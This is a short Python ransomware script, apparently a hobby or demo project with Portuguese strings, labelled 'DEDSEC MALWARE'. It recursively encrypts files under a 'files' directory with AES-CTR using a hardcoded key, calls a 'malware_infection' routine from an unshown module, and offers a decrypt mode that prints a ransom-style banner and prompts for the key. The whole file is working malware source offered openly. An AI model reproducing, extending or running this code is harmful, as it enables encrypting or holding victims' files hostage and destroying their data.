import argparse
import os
import Discovery
import Crypter
from Crypto.Cipher import AES
from Crypto.Util import Counter



KEY_HARDCOED = 'hackware strike force strikes u!'

def get_parser():
    parser = argparse.ArgumentParser(description='DEDSEC MALWARE')
    parser.add_argument('-d', '--decrypt', help='decripta os arquivos [default:no]', action='store_true')
    return parser

def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('''
         \033[1;31mRANSOWARE FELIPERETR0

         [+] - Seus aquivos foram criptografados. 
         quebra de criptografia '{}'
        '''.format(KEY_HARDCOED))
        key = input('digite a senha >')
    else:
        if KEY_HARDCOED:
            key = KEY_HARDCOED
    conta = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=conta)
    if not decrypt:
        cryptoMALWARE = crypt.encrypt
    else:
        cryptoMALWARE = crypt.decrypt
    
    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
    startDirs = [init_path]

    for currentDir in startDirs:
        for filename in Discovery.discovery(currentDir):
            Crypter.malware_infection(filename, cryptoMALWARE)
    
    # limpar a chave de criptografia da memória

    for _ in range(100):
        pass

    if not decrypt:
        pass
if __name__ == '__main__':
    main()